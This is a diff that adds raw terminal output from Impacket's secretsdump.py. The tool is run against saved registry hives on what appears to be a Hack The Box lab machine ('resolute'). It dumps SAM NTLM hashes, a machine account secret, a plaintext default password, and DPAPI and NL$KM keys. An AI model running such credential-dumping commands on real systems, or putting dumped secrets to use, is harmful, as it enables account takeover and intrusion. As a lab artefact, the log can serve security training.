@@ -1,0 +1,26 @@
+root@kali:~/htb/resolute# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x05c55447fe5b66a7770d4b383e16e4de
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b4035e088443e415a73f3c41720dc8e9:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:0c0d5391155d8047f4311889969c61ab3a0e22cdaf414ec34631c3c1467c7b8ff8235984bc9c72aad37e5ecfe9efb5b500f5f0c080f62212f697671a0c65306d65bfd882420c18c101604cf2e6dbc3ec0020af4a0377f3508e941f79b6ab0843fbd075ba1b85efa90b0394f9ef333bf5ce9c1359a060f1ca5c8fb031829e2cdb497577416c3495fa975a59c70e53d4c0af17fc00e74edb6bc53dc6c64773e9137adff41d0bdd2409719a2251ee384ad8235cbb846d847cf19e1b1c490bd399b74d872949158ef00e098bd345d0626b08dab4570e1ee8d9894972073adde6cb3873843d5d4e5cc2b5e8a3c8e67adfa260
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0bf693233b0c8d9b45a8839901173d4f
+[*] DefaultPassword 
+(Unknown User):DontH4ckUsPleeze!
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x13ec6ea2ad3cf2929ab3ac9fcde6a1140342eac5
+dpapi_userkey:0x1bd8bda5c9814300b9a581fb468e78261a936302
+[*] NL$KM 
+ 0000   D8 33 7F 7B A3 2C DE 15  CF B4 9A 10 37 3F 6B A9   .3.{.,......7?k.
+ 0010   4E 49 46 70 57 27 E8 1E  E8 A9 11 A8 1D EF 19 0C   NIFpW'..........
+ 0020   CC 43 92 F3 9C C7 51 1A  06 56 6D 60 DA 73 22 74   .C....Q..Vm`.s"t
+ 0030   81 EC B4 9F 69 FC 6A 8A  C8 52 E6 F5 03 56 0D 59   ....i.j..R...V.Y
+NL$KM:d8337f7ba32cde15cfb49a10373f6ba94e4946705727e81ee8a911a81def190ccc4392f39cc7511a06566d60da73227481ecb49f69fc6a8ac852e6f503560d59
+[*] Cleaning up... 
+
